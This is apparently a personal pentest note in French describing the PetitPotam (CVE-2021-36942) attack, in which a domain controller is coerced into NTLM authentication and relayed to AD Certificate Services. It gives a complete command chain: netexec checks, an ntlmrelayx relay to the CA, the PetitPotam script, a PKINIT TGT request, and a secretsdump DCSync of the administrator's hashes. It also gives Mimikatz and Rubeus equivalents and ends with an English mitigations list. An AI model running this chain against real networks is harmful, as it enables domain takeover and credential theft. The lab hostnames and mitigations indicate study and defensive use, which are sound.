
[CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)

https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/

> [!TIP]
> Attaque par contrainte (coercition)
> Permet à un attaquant non authentifié de forcer le DC à s'authentifier auprès d'un autre hôte en utilisant NTLM sur le port 445 via LSARPC et [MS-EFSRPC](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31).
> 

> [!REQUIS]
> ADCS Doit être utilisé

# LINUX

## PetitPotam

https://github.com/topotam/PetitPotam


1. Identifier si target vulnérable

```bash
nxc smb <ip> -u '' -p '' -M coerce_plus -o METHOD=PetitPotam
```

2. Identifier la location du CA

```bash
nxc smb <ip> -u '' -p '' -M enum_ca
```

3. Lancer Ntlmrelay vers l'URL du CA

```shell
sudo impacket-ntlmrelayx -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```

4. Lancer PetiPotam

```shell
python3 PetitPotam.py <attack_host_ip> <dc_ip> 
```

Si l'attaque a fonctionné, le certificat en base64 doit avoir été récupéré par ntlmrelay

5. Requête d'un TGT grâce au certificat avec PKINIT

```shell
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
```

6. Injecter le ticket

```shell
export KRB5CCNAME=dc01.ccache
```

7. DCSync pass the ticket

```shell
impacket-secretsdump -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```


# WINDOWS

## Invoke-PetitPotam

[Invoke-PetitPotam.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1)


## 1. Mimikatz


Lancer PetitPotam

```bash
 misc::efs /server:<Domain Controller> /connect:<ATTACK HOST>
```


## 2. Rubeus

Requete d'un TGT avec le Certificat et Pass The Ticket

```powershell
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:<base64 cert> /ptt
```

## 3. [[OFFSEC/PENTEST/2. INFRA - INTERNE/6. POST EXPLOITATION/3. AD (avec creds)/Persistance/1. DCSYNC#Mimikatz]]



---


## PetitPotam Mitigations

First off, the patch for [CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942) should be applied to any affected hosts. Below are some further hardening steps that can be taken:

- To prevent NTLM relay attacks, use [Extended Protection for Authentication](https://docs.microsoft.com/en-us/security-updates/securityadvisories/2009/973811) along with enabling [Require SSL](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429) to only allow HTTPS connections for the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services
- [Disabling NTLM authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain) for Domain Controllers
- Disabling NTLM on AD CS servers using [Group Policy](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-incoming-ntlm-traffic)
- Disabling NTLM for IIS on AD CS servers where the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services are in use